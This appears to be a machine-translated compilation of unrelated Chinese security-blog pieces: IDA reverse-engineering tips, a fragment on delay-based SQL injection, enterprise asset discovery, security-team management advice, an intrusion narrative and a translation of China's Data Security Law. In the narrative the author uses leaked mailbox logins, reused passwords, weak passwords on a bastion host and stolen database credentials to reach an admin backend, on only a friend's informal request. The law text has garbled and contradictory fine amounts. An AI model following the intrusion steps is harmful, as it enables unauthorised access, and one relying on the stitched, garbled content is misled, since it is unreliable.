The assembly code at 401060 may be complicated in a real environment, but the idea is the same, and other methods can be used for the code encrypted to this S M C or other technology in the IDA.

Signature sometimes when we decompile the library, the IDA will not recognize the real name of this function, may only give you the corresponding function address.

We can press shift + F5 to open the list of application library modules, and then press Ins to apply the correct library, and the IDA automatically analyzes the whole code.

If the IDA does not resume the automatic analysis, we can click on the reanalysis program in the option- "routine-" analysis.

If there is not the library files we want, IDA also provides its own signature files, specific production methods you can own Baidu.

Plug-in IDC script works for small tasks and fast development work, but it does not support complex data types and some complex tasks, IDA provides plugin functionality, and supports win32API and lots of standard libraries, which provides good conditions for the development of plugins.

We can develop IDA plugins ourselves or directly use plugins developed by others.

Install the plug-in is simple, copy the already compiled plug-in module to the plugins directory of the IDA installation directory, note that some plug-ins may have compatibility problems, read its documentation before installation, view the supported IDA version and usage instructions.

The IDA debugger IDA supports local debugging and remote debugging.

Use some tips from IDA If you want to understand the parameter transfer of a function, press CTRL + K on its function to open its stack and see the variables used, you can also rename it yourself.

Find main functions under windows and Linux many executables are not executed directly from the main() function but do some initialization and then go to the main() function.

main() functions are often located before the executable because many linkers process the object files before the static library.

GCC passes the address of the main() function into __libc_start_main to call the main function, check the called parameters can find the address of the main() function other static analysis operations when we get a program more than only use IDA to static analysis, we can also use other tools to obtain some information.

Below we drag into the IDA for analysis s h i f t + F12 open the string window and find two suspicious strings, probably key logic we double click past, then ctrl + x find cross reference and then click the sub_401090 + 1FF function into the reference string.

We then press F5 to become pseudocode, and analyze below we click on string to find that only 3 bits are saved, and the next 3 bits will overflow to the later var_101,var_100,var_FF.

If you want to better use IDA, solid compilation skills, skilled to master the program development and operation process, algorithm foundation, etc., it is indispensable, so there is a long way to go, we must not float sand to build a high platform.

Since the number of existing data rows of the second keyword reaches two, a syntax error occurs, terminating the execution of the entire statement, so the original function of the current insert/delete/update/select statement is also terminated.

But the conditional statement constructed at payload1 has been executed to get the desired page latency.

So, all the processing of SQL statements occurs inside the server, no need to report false information, no need to worry about the conditional judgment statement will not execute, the final implementation principle is the same as the delay injection of select.
At present, we mainly manage these kinds of assets, including IP network segment, domain name, intranet server assets, extranet server assets, application system assets, and terminal assets. Each kind of asset can be considered from several aspects of field content confirmation, data source, update mechanism, and later optimization.

Each kind of asset will have a special personnel management in the internal process of the company, then we can communicate with the corresponding responsible person in charge, adopt a unified asset management system to confirm the update mechanism, so that the assets can be updated in real time.

We embed the page of the new domain name in the asset management system into the domain name application process, so that when a person applies for a domain name, he must fill in the corresponding information, before the process can pass. This can require the domain name manager to control and review, and the domain name can also be processed the same.

After the combing of known assets is completed, the unknown assets certainly need to be managed next, but how to find the unknown assets?

This is the difficulty in enterprise asset management and also the key point. From the past experience, the security events caused by unknown assets are not uncommon, and they are not less invited to drink tea by the leaders. In order to minimize and avoid this situation, it can be considered from the following aspects.

Asset discovery requires the fingerprint identification of the host or application system within a certain range, including the operating system version, open ports, service provided, service version and other fingerprints, etc.

Asset discovery can be combined by means of main and passive asset discovery, and active detection is mainly used for the detection of assets under the unknown network, including network host detection, port detection and scanning, hardware characteristics and version information detection.

Passive detection mainly refers to collecting the traffic of the target network, analyzing the application layer HTTP,FTP,SNMP in the traffic, so as to realize the passive detection of network asset information, used for continuously monitoring undetected assets under the known network, and completing the completion of asset attributes through information completion and deep scanning.

Masscan is a full-port scanning artifact for the large network segment, which should be the fastest of the existing port scanner in terms of scanning speed. Nmap is a typical representative of the network asset detection tool based on the response protocol stack fingerprint. Masscan conducts the first fast scan, and then performs the Nmap confirmation service to realize fast full-port scanning.

This is before CMDB construction, we use temporary solutions, there are many places need to perfect with optimization, but the overall guarantee emergency response asset accuracy above 90%, compared to the e x c l e form maintenance, assets scattered, incomplete data, has improved several levels, also for the next CMDB construction provides certain data and process basis, hope that CMDB will not be disappointed, interested friends can communicate together, share.

From the current situation, the proportion of Party A's safety team personnel in an enterprise is still very low. In the construction of enterprise safety, most of the safety measures are implemented by the system, business and development team.

At this time, for the security team, it is very important to pay attention to the security work methods, so that the enterprise information security construction gradually to the right track.

In the early stage of the extensive development of enterprises, or even into the ranks of large enterprises, information security may not even enter the scope of CTO thinking, let alone the CEO-level management.

Of course, the situation has been much better in the past two years. After the issuance of the Network Security Law and the establishment of the Cyberspace Commission of the CPC Central Committee, it is necessarily politically correct for the CEO-level management to publicly support the cyber security work, but this will not necessarily become a strong backing for you to carry out the information security work.

In my opinion, the strongest backing of information security work should be the data center leader or CTO personnel, because the biggest victim of information security event may be them, and the most likely to perform a major information security event.

Therefore, to some extent, we are the same with the security demands of the data center leader or the CTO leader. We should closely follow around them and appropriately use their power and influence to pass on some information security demands.

But, we can't go to the CTO for anything, if so, what about your information security department?Some things can control the risk at the same level.

Here's a question that needs to need to be solved at the CTO level?The CSO's need to consider mastering it themselves.

Although information security occupies a certain policy advantage and leadership support advantage, it is a basic fact that cannot be ignored. Therefore, this requires the information security team to find confederates within the enterprise to deal with more prominent security risks.

In general, the infrastructure sector is a good confederate choice, such as the network team, the cloud management platform team, the host system team, etc.

By uniting the Confederates, we can manage the application and development safety well together, and then gradually raise some easy rectification safety needs to the infrastructure department. After all, it is also a comrade in a trench, and the infrastructure department is probably embarrassed to refuse.

Of course, there are also great differences between the prominent contradictions and situations encountered by different units, and what kind of Confederates to find for needs to be considered by themselves.

Although the enterprise security team may embrace a great ideal, team construction may be ambitious, complacent, want to improve the enterprise security level as soon as possible, but, for system, development and business team, enterprise security construction and management is to add workload, may because of a safety requirements to their whole system to redo, from thought, consciousness have certain resistance is human.

Therefore, for enterprise security construction, the most important work is to do research, understand the enterprise IT construction and security management situation, identify the biggest risk of organizations and enterprises, and then according to the risk to find out the safety management method, grasp the main contradiction of security risk, this is also a specific aspect of ROI balance, it is impossible to grasp, everything tube, no focus, the weak security team into each project or affairs, cannot unite to do a thing, finally estimate is difficult to become.

Still applicable in security management, when we like tang's monk read tip risk, reveal risk, but no use of any loopholes, also can't come out with the effective risk avoidance method, for other people in the enterprise, these language are pale, but also useless to information security department, insufficient ability, etc.

Risk is originally abstract, conveying abstract concepts to employees in the enterprise, and we can only talk about the results, such as taking control of the system and downloading key data.

Therefore, we should give full play to our professional ability, make use of penetration testing, crowd testing, offensive and defensive drills to maximize the discovery and prove all kinds of risks and hazards, and use fresh examples to educate employees.

The two biggest driving forces for safety work are: event-driven and regulatory requirements.

Internal security events can't happen often, external events are always a little scratching the surface, you can say, but it's hard to translate into motivation for action.

Most of the time, only the regulatory requirements can be said, but we should also pay attention that we should not take the regulatory requirements, security system and other blind requirements according to the rules, item by one, do not consider the status quo of enterprises, which will make Ben-Ben and dogmatic mistakes.

For example, the regulatory requirements require that the production and testing networks should be strictly isolated.

This intention is certainly good, but effective implementation within the enterprise will certainly face great obstacles, for example, some systems want to operate to achieve test and production connectivity; some systems cost much to build a test system in the test environment, which can lead to production and test cannot be completely isolated.

At this time, the security department is necessary to have the problem specific analysis, flexible treatment, without the violation of major principles, leading to major risks can be the appropriate, have a limited green light.

In the internal rules and regulations of enterprises, information security will generally have a certain right of assessment and punishment, and there may also be direct authorization from some big leaders, as a sword of enterprise security management.

Although, our original intention and purpose is not punishment, the main focus is to improve safety awareness.

However, we should understand that our punishment will cause economic and reputational losses for others, which will have a certain rebellion to the information security team itself.

Similarly, for other personnel, this will also lead to a certain estrangement between the information security team, and from then on, they do not cooperate with the information security management, or surface support, secretly perfunctory, or even stumbling blocks, which will bring great obstacles to the information security work.

However, in the long run, the right to assessment and punishment power are still the main starting point for us to promote information security work.

In the real scene, some Party B personnel jokingly call Party A "Party A father", which is a joke, in fact, Party A's contract is their really "Party A father", we all work.

As a safety personnel of Party A, we should also understand that in the background of rapid business development and increasing degree of informatization, there is still a certain gap between Party A's safety personnel and Party A's in the safety construction needs of Party A in terms of quantity and professional skills.

At this time, Party B's team is an important supplement to Party A's information security construction strength.

Many scheme design, risk analysis and technical implementation require the in-depth participation of Party B's personnel. After all, they are more visible and widely knowledgeable than Party A's personnel in our subdivided fields and professional scenarios.

As Party A's team personnel, we should be good at using Party B's team and unite and lead Party B's team to quickly build Party A's information security governance system efficiently.

For Party A, the construction of information security is not only a technical problem, but it has surpassed the technical problem, which involves many problems of checks and balances, communication, coordination, compromise and other aspects.

As the information security personnel of Party A, when understanding the professional knowledge of information security, we should also grasp more strategic and tactical methodology, so that the enterprise information security work can be better promoted and implemented.

Some time ago, a friend sent me a management system, saying that he asked me to help test if I could log in to the background, so I started the information collection for the system.

The target domain name has a node, can not obtain the real address at first, and then through checking the query certificate, found another domain name, by obtaining the real address after the domain name.

Information collection friends said information collection can go to collect information to try, maybe can have unexpected harvest, so to try, found a mailbox account: the following server address, test, is tencent enterprise mail login although is a low permission account, but also successful login, there are some mail did not delete, also found some useful information, for example, their enterprise mail system, and the old client and connection mode, also learned that the default password of their new mail system is their Internet account password.

In the process of searching the information, I found a lot of information about the company in a project of the user, so I pulled the project local and audited it.

Enterprise mail information collected in the new enterprise mail collected account password login search keywords: and then check the address book collected information is as follows: 1, the four servers of the ip address, port and password 2, the client compression package 3, password 4, the user name and password.

Since you have and password into the innet, of course, it is to access to the Intranet, install the client, and then find the profile from the mailbox, the first using the password collected invalid, and then tested the account and password, login successfully, successful access to the internal net.

http://192.168.10.98:8080, In the operation and maintenance configuration platform, it can only see some information of the server, but it can not log on the server. However, in the error information of a function, the password of the external network is leaked.

At the early stage, the Intranet cannot determine what the name of the target machine in the Intranet is, because they have more than 2,000 servers and many projects, and the names are different, but after obtaining this, through searching keywords, determine the name of the host inside, you can continue to find the information of the target host.

Just in the process of scanning the c section, also found the fort machine, the fortress machine also has a weak password, can log in directly: in the fortress machine determined the host name collected before the next can indeed be compared with the target system.

The fortress machine platform has a connection interface, which can be connected without secret connection. First, add the target host to a controllable host, and then push the user, and you can log in directly.

In the target machine, we are looking for the database connection information, because our ultimate goal is to log in to the background, that is, we want to find the background username and password in the database.

We found the code folder of the target system in the target machine, then went to view the configuration file, and found that the database connection mode, except for the address, the user name and password were all encrypted, and cannot be decrypted.

Because the target machine database account password can not be decrypted, originally thought that the end of this cannot decrypt, can't continue, but a closer look at his database name, the database connection statement collected on an external network server, there are relevant database connection account password, log in to the external network server, link database, find the administrator table, find the administrator user name and password, test, login success.

The essence of penetration testing is still information collection. Sometimes multi-dimensional information collection for combined mining can get some unexpected harvest.

This Law shall apply to data processing activities and their safety supervision within the territory of the People's Republic of China.

Those who carry out data processing activities outside the People's Republic of China and damage the national security and public interests of the People's Republic of China or the legitimate rights and interests of citizens or organizations shall be investigated for legal responsibility according to law.

Data as mentioned in this Act means any record of information electronically or otherwise.

Data processing, including data collection, storage, use, processing, transmission, provision, disclosure, etc.

Data security refers to taking the necessary measures to ensure that the data is in a state of effective protection and legal use, as well as the ability to ensure a continuous security state.

To maintain data security, we should adhere to the overall national security concept, establish and improve a data security governance system, and improve the data security guarantee capacity.

The Central National Security Leading Agency for China is responsible for the decision-making and coordination of national data security work, study, formulate and guide the implementation of national data security strategies and relevant major policies and policies, coordinate major matters and work of national data security, and establish a coordination mechanism for national data security work.

Each region and department shall be responsible for the security of data and data collected and generated in the work of their respective regions and departments.

The competent departments of industry, telecommunications, transportation, finance, natural resources, health, education, science and technology shall assume the responsibilities of data safety supervision in their respective industries and fields.

Public security organs and state security organs shall, in accordance with the provisions of this Law and relevant laws and administrative regulations, assume the duties of data safety supervision within the scope of their respective functions and duties.

The Cyberspace Administration of China, in accordance with this Law and the provisions of relevant laws and administrative regulations, shall be responsible for coordinating and coordinating network data security and relevant supervision.

The state protects the rights and interests of individuals and organizations related to data, encourages the rational and effective use of data in accordance with the law, guarantees the orderly and free flow of data in accordance with the law, and promotes the development of the digital economy with data as a key factor.

To carry out data processing activities, we should abide by laws and regulations, respect social ethics and ethics, abide by business ethics and professional ethics, be honest and trustworthy, fulfill the obligation of data security protection, assume social responsibilities, shall not endanger national security and public interests, and shall not damage the legitimate rights and interests of individuals and organizations.

The state supports the publicity and popularization of data security knowledge, improves the awareness and level of data security protection of the whole society, promotes relevant departments, industry organizations, scientific research institutions, enterprises and individuals to jointly participate in data security protection work, and form a good environment for the whole society to jointly maintain data security and promote development.

In accordance with the articles of association, relevant industry organizations shall formulate data security norms of conduct and group standards in accordance with the law, strengthen industry self-discipline, guide members to strengthen data security protection, improve the level of data security protection, and promote the healthy development of the industry.

The state has actively carried out international exchanges and cooperation in the fields of data security governance, data development and utilization, participated in the formulation of international rules and standards related to data security, and promoted cross-border security and free flow of data.

Any individual or organization shall have the right to complain or report to the relevant competent departments in violation of the provisions of this Law.

The departments that receive complaints and reports shall deal with them in time according to law.

The competent departments concerned shall keep confidential the relevant information of complaints and informants, and protect the legitimate rights and interests of complaints and informants.

The state plans overall development and security, adheres to promoting data security with data development and utilization and industrial development, and ensures data development and utilization and industrial development with data security.

The state has implemented the big data strategy, promoted the construction of data infrastructure, and encourages and supports the innovative application of data in various industries and fields.

People and people's governments at or above the provincial level shall incorporate the development of digital economy into the national economic and social development plans at the corresponding level, and formulate plans for the development of digital economy as needed.

The state supports the development and utilization of data to improve the intelligence level of public services.

To provide intelligent public services, we should give full consideration to the needs of the elderly and the disabled to avoid causing obstacles to the daily life of the elderly and the disabled.

The state supports data development and utilization and research on data security technology, encourages technology promotion and commercial innovation in the fields of data development and utilization and data security, and cultivate and develop data development and utilization and data security products and industrial systems.

The state has promoted the construction of a standard system for technology and data security for data development and utilization.

The competent administrative department of standardization under the State Council and the relevant departments under the State Council shall, in accordance with their respective functions and duties, organize the formulation and timely revision of relevant standards for technology, products and data security for data development and utilization.

The state supports enterprises, social organizations, educational and scientific research institutions in the formulation of standards.

The state promotes the development of services such as data security testing, evaluation and certification, and supports professional institutions such as data security testing, evaluation and certification in carrying out service activities in accordance with the law.

The state supports relevant departments, industry organizations, enterprises, education and scientific research institutions, and relevant professional institutions to cooperate in the risk assessment, prevention and disposal of data security.

The state has established and improved the data trading management system, standardized the data trading behavior, and cultivated the data trading market.

The state supports education, scientific research institutions and enterprises in carry out education and training related to data development and utilization technology and data security, train professionals in data development and utilization technology and data security, and promote talent exchanges.

The state to establish data classification protection system, according to the importance of data in economic and social development, and once the tampering, damage, leakage or illegal access, illegal use, to national security, public interests, or legitimate rights and interests of individuals, organizations, data classification protection.

The national data security work coordination mechanism coordinates relevant departments to formulate important data directories and strengthen the protection of important data.

Data related to national security, the lifeline of the national economy, important people's livelihood, and major public interests belong to the core national data, and a stricter management system will be implemented.

All regions and departments shall, in accordance with the data classification and classification protection system, determine the specific catalogues of important data in their respective regions, departments, related industries and fields, and focus on protecting the data listed in the catalogues.

The state has established a centralized, unified, efficient and authoritative data security risk assessment, reporting, information sharing, and monitoring and early warning mechanism.

The national data security work coordination mechanism coordinates relevant departments to strengthen the acquisition, analysis, judgment and early warning of data security risk information.

The state has established a data security emergency response mechanism.

In the event of data security events, the relevant competent departments shall start the emergency plan according to law, take corresponding emergency response measures to prevent the expansion of hazards, eliminate potential safety risks, and release warning information related to the public in a timely manner.

The state shall establish a data security review system to conduct a national security review on data processing activities that affect or may affect national security.

The security review decision made according to law is final.

The State shall implement export control in accordance with the law on controlled data related to the safeguarding of national security and interests and the performance of international obligations.

Where any country or region has taken discriminatory prohibitions, restrictions or other similar measures against the People's Republic of China in investment and trade related to data and data development and utilization technologies, the People's Republic of China may take measures against the country or region according to the actual situation.

To carry out data processing activities, in accordance with the provisions of laws and regulations, establish and improve the whole process data security management system, organize and carry out data security education and training, and take corresponding technical measures and other necessary measures to ensure data security.

Using data processing activities such as the Internet and other information networks, the above data security protection obligations shall be fulfilled on the basis of the network security level protection system.

The processor of important data shall clarify the responsible person and management organization of data security, and implement the responsibility for data security protection.

Carrying out data processing activities and research and development of new data technologies should be conducive to promoting economic and social development, improving people's well-being, and be in line with social ethics and ethics.

Risk monitoring of data processing activities shall be conducted, which shall be strengthened. When risk measures are found in data security defects and loopholes, remedial measures shall be taken immediately; in case of data security incidents, disposal measures shall be taken immediately, inform users in time and report to the relevant competent authorities in accordance with regulations.

The processors of the important data shall regularly carry out the risk assessment on their data processing activities in accordance with the regulations, and submit the risk assessment reports to the relevant competent departments.

The risk assessment report shall include the type and quantity of important data processed, the development of data processing activities, the data security risks faced with it and its countermeasures, etc.

The exit security management of important data collected and generated by the operators of the PRC shall apply to the provisions of the Network Security Law of the People's Republic of China; the exit security management measures of other important data collected and generated in the operation of the PRC shall be formulated by the State Cyberspace Administration in conjunction with the relevant departments of the State Council.

Any organization or individual to collect data shall take a legal and legitimate way, and shall not steal or obtain data in other illegal ways.

Where laws or administrative regulations have provisions on the purpose and scope of the collection or use of data, the data shall be collected and used within the purpose and scope prescribed by laws or administrative regulations.

An institution engaged in data transaction intermediary services shall require the data provider to explain the data source, examine the identity of both parties to the transaction, and keep the audit and transaction records.

Where laws and administrative regulations stipulate that an administrative license shall be provided, the service provider shall obtain the license according to law.
The public security organs or state security organs shall, when obtaining data due to the need of safeguarding national security or investigating crimes according to law,, in accordance with the relevant provisions of the State, go through strict approval procedures in accordance with the law, and the relevant organizations and individuals shall cooperate.

The competent organs of the People's Republic of China shall, in accordance with relevant laws and international treaties or agreements concluded or participated in by the People's Republic of China, or in accordance with the principle of equality and reciprocity, handle the requests of foreign judicial or law enforcement agencies on the provision of data.

Without the approval of the competent authority of the People's Republic of China, organizations or individuals within the territory cannot provide foreign judicial or law enforcement agencies with data stored within the territory of the People's Republic of China.

Article 37 \ u3000 Countries will vigorously promote the construction of e-government affairs, improve the scientific nature, accuracy and timeliness of government affairs data, and improve the ability to use data to serve economic and social development.

State organs shall collect and use data to perform their statutory duties, in accordance with the conditions and procedures prescribed by laws and administrative regulations; and personal privacy, personal information, business secrets, confidential business information known in the performance of their duties shall be kept confidential according to law, and shall not be disclosed or illegally provided to others.

State organs shall, in accordance with the provisions of laws and administrative regulations, establish and improve the data security management system, implement the responsibility for data security protection, and ensure the security of government affairs data.

State organs that entrust others to build and maintain an e-government system and store and process government data shall go through strict approval procedures, and shall supervise the entrusted party to fulfill its corresponding data security protection obligations.

The trustee shall perform its obligation of data security protection in accordance with the provisions of laws and regulations and the contract, and shall not retain, use, disclose or provide government data to others without authorization.

State organs shall follow the principles of justice, fairness and convenience, and disclose government data in a timely and accurate manner in accordance with regulations.

Except for those that are not made public according to law.

The state has formulated a catalogue of open government data, established a unified, standardized, interconnected, safe and controllable platform for open government data, and promoted the opening and utilization of government data.

The provisions of this Chapter shall apply to organizations authorized by laws and regulations to carry out data processing activities in order to perform their legal duties.

If the relevant competent departments, in performing the duties of data safety supervision, find that the data processing activities have a great safety risk, they may interview the relevant organizations and individuals in accordance with the prescribed authority and procedures, and require the relevant organizations and individuals to take measures to make rectification and eliminate the hidden dangers.

An organization or individual carrying out data processing activities fails to fulfill the data security protection obligations stipulated in Article 27,29 and 30 of this Law, The relevant competent authorities shall order them to make corrections, Give a warning, He may also be fined not less than 50,000 yuan but not more than 500,000 yuan, The person in charge and other persons directly responsible may be fined not less than 10,000 yuan but not more than 100,000 yuan; Refusing to correct or cause serious consequences such as a large number of data leakage, A fine of not less than 500,000 yuan but not more than 2 million yuan, And may be ordered to suspend the relevant business, suspend business for rectification, revoke the relevant business license or revoke the business license, The person in charge directly responsible and other persons directly responsible shall be fined not less than RMB 50,000 yuan but not more than RMB 200,000 yuan.

In violation of the national core data management system and endangers the national sovereignty, security and development interests, the competent authorities shall be fined not less than 2 million yuan but 100 yuan, and order the relevant authorities to suspend relevant business, suspend business for rectification, revoke relevant business license or revoke their business license; if it constitutes a crime, it shall be investigated for criminal responsibility according to law.

Whoever, in violation of Article 31 of this Law, provides important data abroad shall order relevant competent authorities to make corrections, give a warning, and impose a fine of not less than 100,000 yuan but 100,000 yuan but 100,000 yuan, 000 yuan on the directly responsible persons and other persons directly responsible, 100 million yuan, and may be ordered to suspend relevant business, suspend business operations, revoke relevant business licenses or revoke business licenses, and be fined not more than 100,000 yuan and other persons directly responsible.

If an institution engaged in data transaction intermediary service fails to perform the obligations stipulated in Article 33 of this Law, it shall order the relevant competent authorities to make corrections, confiscate the illegal income, be fined not less than one but not more than 10 times the illegal income, not less than 100,000,100,000,000 yuan, and may be ordered to suspend relevant business, suspend business licenses or revoke their business licenses; and the directly responsible persons not less than 10,000 yuan but not 100,000,000 yuan and other directly responsible persons.

Those who, in violation of Article 35 of this Law, refuse to cooperate with the transfer of data shall be ordered by the relevant competent authorities, given a warning and imposed a fine of not less than 50,000 yuan but not more than 500,000 yuan. The person directly responsible shall be fined not less than 10,000 yuan but not more than 100,000 yuan and other person directly responsible.

In violation of the provisions of Article 36 of this Law, those who provide data to foreign judicial or law enforcement agencies without approval from the competent authorities shall give a warning, impose a fine of not less than 100,000 yuan but 100,000 yuan but 100,000 yuan, may be fined not less than 1 million yuan, and may be ordered to suspend relevant business, suspend business for rectification, revoke their business license or revoke the directly responsible, and fined not less than 50,000 yuan but 500,000 yuan and other directly responsible persons.

If a state organ fails to fulfill the obligation of data security protection provided for in this Law, the person in charge and other persons directly responsible shall be given sanctions according to law.

State functionaries who perform their duties of data security supervision and who neglect their duties, abuse their power or engage in malpractices for personal gain shall be given sanctions according to law.

Whoever steals or obtains data in other illegal ways, carries out data processing activities to exclude or restrict competition, or damages the legitimate rights and interests of individuals or organizations shall be punished in accordance with the provisions of relevant laws and administrative regulations.

Those who violate the provisions of this Law and cause damage to others, they shall bear civil liability according to law.

Where a violation of the provisions of this Law constitutes a violation of the administration of public security, punishment shall be imposed according to law; if a crime constitutes constituted, it shall be investigated for criminal responsibility according to law.

To carry out data processing activities involving state secrets, the Law of the People's Republic of China on Safeguarding State Secrets and other laws and administrative regulations shall apply.

To carry out data processing activities in statistics and archives work, and to carry out data processing activities involving personal information, we should also abide by the provisions of relevant laws and administrative regulations.

Measures for the security protection of military data shall be separately formulated by the Central Military Commission in accordance with this Law.

This Law shall come into force on September 1,2021.

According to CCTV News, Chinese President Xi Jinping signed presidential orders No.84,85,86,87,88,8.89 and 90, on June 10.

Chairman Decree No.84 said that the promulgation of the Data Safety Law of the People's Republic of China has been adopted at the 29th meeting of the Standing Committee of the 13th People's National People's Congress of China on June 10,2021, and will come into effect on September 1,2021.

CCTV News, June 10 news: today, the 29th session of the 13th National People's Congress Standing Committee voted to pass a number of bills and two decisions.

These include the Data Safety Law, the Anti-Foreign Sanctions Law, and the decision on izing the Shanghai Municipal People's Congress and its Standing Committee to formulate regulations in the Pudong New Area.

At far, the Data Security Law has not been released and FreeBuf will continue to follow up.

In June 2020, the 20th session of the Standing Committee of the 13th National People's Congress first deliberated on the draft Data Security Law.

The first draft stipulates the formulation of important data catalogue by localities and departments.

Some members of the Standing Committee and local governments, departments, enterprises and experts have proposed that important data catalogues should be determined at the national level, and then local governments and departments should formulate specific catalogues accordingly.

On April 26,2021, the 28th meeting of the Standing Committee of the 13th National People's Congress heard a report made by Xu Hui, vice chairman of the draft Data Safety Law, on the revision of the Constitution and Law Committee, which is the second trial.

In accordance with the opinions of all parties, the second draft of the meeting of the Standing Committee is proposed to make the following major amendments: First, the meaning of the data security language in the draft will be improved.

Second, we will improve the data classification and important data protection systems.

Third, we will enrich the data exit security management regulations.

Since then (April 29,2021), the Chinese People's Congress has published the Data Safety Law of the People's Republic of China (the second draft) online, among which it has been revised.

The scope of the main revision includes: improving the data classification protection system; strengthening the basic role of equal protection in data security protection requirements, the management of new important data and corresponding legal responsibility, strengthening the supervision of data provided by overseas judicial / law enforcement agencies, and adding the legal responsibility for explicitly refusing to cooperate with data transfer, etc.

"Data safety law (draft)" three review or after the following two review, the NPC standing committee spokesman Zang Tiewei has said, according to various opinions, to the standing committee meeting of the draft three review for the following main modification: one is to establish work coordination mechanism, strengthen the data security work as a whole.

Second, we will clearly implement a stricter management system for data related to national security, the lifeline of the national economy, important people's livelihood, and major public interests.

Third, it is required that intelligent public services should fully consider the needs of the elderly and the disabled, and shall not cause obstacles to the daily life of the elderly and the disabled.

Fourth, we will further improve the regulations on ensuring the security of government data.

Fifth, increase the punishment for illegal acts.

Therefore, the Data Security Law passed by this vote is compared with the second draft or supplemented as revised above.

In the following, the Data Safety Law will be refined, and the key points of the new law will be further clarified through comparison with the second draft.

In June 2020, the 20th Session of the Standing Committee of the 13th National People's Congress held the first review of the draft Data Safety Law.

On April 26,2021, the 28th meeting of the Standing Committee of the 13th National People's Congress conducted a second trial of the draft amendment to the Data Safety Law.

After the two deliberations, Zang Tiewei, spokesman for the Law Working Committee of the NPC Standing Committee, said that according to the opinions of all parties, the following amendments were proposed in the three drafts: First, establish a work coordination mechanism to strengthen the overall coordination of data security work.

Second, we will clearly implement a stricter management system for data related to national security, the lifeline of the national economy, important people's livelihood, and major public interests.

Third, it is required that intelligent public services should fully consider the needs of the elderly and the disabled, and shall not cause obstacles to the daily life of the elderly and the disabled.

Fourth, we will further improve the regulations on ensuring the security of government data.

Fifth, increase the punishment for illegal acts.

According to the comparison of the Data Safety Law, it can be found that these five points are reflected in them.

On the basis of the second draft, the Data Safety Law adopted the suggestion of establishing a work coordination mechanism and optimized the overall planning work of data security.

Article 6 of the second draft The central national security leading organ shall be responsible for the decision-making and overall coordination of data security work, and study, formulate, and guide the implementation of national data security strategies and relevant major policies and policies.

Article 5 of the Data Safety Law, the central national security leading organ is responsible for the decision-making and coordination of national data security work, study, formulate and guide the implementation of national data security strategies and relevant major policies and policies, coordinate major matters and important work of national data security, and establish a mechanism of national data security coordination mechanism.

Second draft 20 countries establish data classification protection system, according to the importance of data in economic and social development, and once tampered with, damage, leakage, illegal access, illegal use, to the national security, public interests or the legitimate rights and interests of citizens, organizations, data classification protection, and determine the important data directory, strengthen the protection of important data.

All regions and departments shall, in accordance with the data classification and classification protection system, determine the specific catalogues of important data in their respective regions, departments, related industries and fields, and focus on protecting the data listed in the catalogues.

"Data safety law" article 21 of the state to establish data classification classification protection system, according to the importance of the data in economic and social development, and once tampered with, damage, leakage, illegal access, illegal use, to national security, public interests or the legitimate rights and interests of individuals, organizations, data classification protection.

The national data security work coordination mechanism coordinates relevant departments to formulate important data directories and strengthen the protection of important data.

Data related to national security, the lifeline of the national economy, important people's livelihood, and major public interests belong to the core national data, and a stricter management system will be implemented.

All regions and departments shall, in accordance with the data classification and classification protection system, determine the specific catalogues of important data in their respective regions, departments, related industries and fields, and focus on protecting the data listed in the catalogues.

Article 21 The State shall establish a centralized, unified, efficient and authoritative data security risk assessment, reporting, information sharing, and monitoring and early warning mechanism, and strengthen the acquisition, analysis, research and judgment, and early warning of data security risk information.

Article 22 of The Data Safety Law The State shall establish a centralized, unified, efficient and authoritative data security risk assessment, report, information sharing, monitoring and early warning mechanism.

The national data security work coordination mechanism coordinates relevant departments to strengthen the acquisition, analysis, judgment and early warning of data security risk information.

Data security management system "data security law" requirements in the data processing activities while fulfill the obligation of data protection, and strictly stipulated the competent authority of the People's Republic of China in the relevant foreign data activities should abide by the principle, emphasizes the basic status of the network security level protection system, standardize the main body.

Compared with the second draft, the regulations are more detailed and have stricter management.

Article 26 of the second draft of data processing activities shall, in accordance with the provisions of laws and regulations, on the basis of the network security level protection system, establish and improve the whole-process data security management system, organize data security education and training, and take corresponding technical measures and other necessary measures to ensure data security.

The processor of important data shall clarify the responsible person and management organization of data security, and implement the responsibility for data security protection.

Article 27 of the Data Safety Law, Data processing activities shall, in accordance with the provisions of laws and regulations, establish and improve the whole-process data security management system, organize and carry out data security education and training, and take corresponding technical measures and other necessary measures to ensure data security.

Using data processing activities such as the Internet and other information networks, the above data security protection obligations shall be fulfilled on the basis of the network security level protection system.

The processor of important data shall clarify the responsible person and management organization of data security, and implement the responsibility for data security protection.

Article 35 Any judicial or law enforcement agency outside the People's Republic of China requiring the transfer of data stored within the People's Republic of China shall not be provided without the approval of the competent authority of the People's Republic of China; Where international treaties or agreements concluded or participated in by the People's Republic of China have provided, they may be implemented in accordance with its provisions.

Article 36 The Data Security Law The competent authority of the People's Republic of China shall, in accordance with relevant laws and the international treaties or agreements concluded or participated in by the People's Republic of China, or in accordance with the request of foreign judicial or law enforcement agencies in accordance with the principle of equality and mutual benefit, on the data provision.

Without the approval of the competent authority of the People's Republic of China, organizations or individuals within the territory cannot provide foreign judicial or law enforcement agencies with data stored within the territory of the People's Republic of China.

According to the suggestion of the Data Safety Law adds new regulations on the protection of the rights and interests of the elderly and the disabled in Chapter II on the data security and development of the second instance.

While supporting and improving intelligence, we should give full play to humanistic care, put people first, consider the needs of vulnerable groups, and make intelligent public services provide convenience for more people.

Article 15 of the Data Safety Law The State supports the development and utilization of data to improve the intelligent level of public services.

To provide intelligent public services, we should give full consideration to the needs of the elderly and the disabled to avoid causing obstacles to the daily life of the elderly and the disabled.

For sensitive government data, on the basis of the second draft, the Data Safety Law emphasizes that the sensitive information obtained in the data processing process of data should be kept confidential in accordance with the law, and stipulates the way to process sensitive information.

Article 37 If State organs need to collect and use data to perform their statutory duties, they shall, within the scope of performing their statutory duties, proceed in accordance with the conditions and procedures prescribed by laws and administrative regulations.

Article 38 A state organ shall collect and use data in order to perform their statutory duties, and shall comply with the conditions and procedures prescribed by laws and administrative regulations within the scope of performing their statutory duties; personal privacy, personal information, business secrets, confidential business information known in the performance of their duties shall be kept confidential according to law and shall not be disclosed or illegally provided to others.

Article 39 State organs shall entrust others to build and maintain the e-government system, store and process government data, or provide government data to others, which shall go through strict approval procedures, and shall supervise the trustee and the data receiver to perform the corresponding data security protection obligations.

Article 40 of the Data Safety Law. State organs that entrust others to build and maintain the e-government system and store and process government data shall go through strict approval procedures, and shall supervise the entrusted party to fulfill its corresponding data security protection obligations.

The trustee shall perform its obligation of data security protection in accordance with the provisions of laws and regulations and the contract, and shall not retain, use, disclose or provide government data to others without authorization.

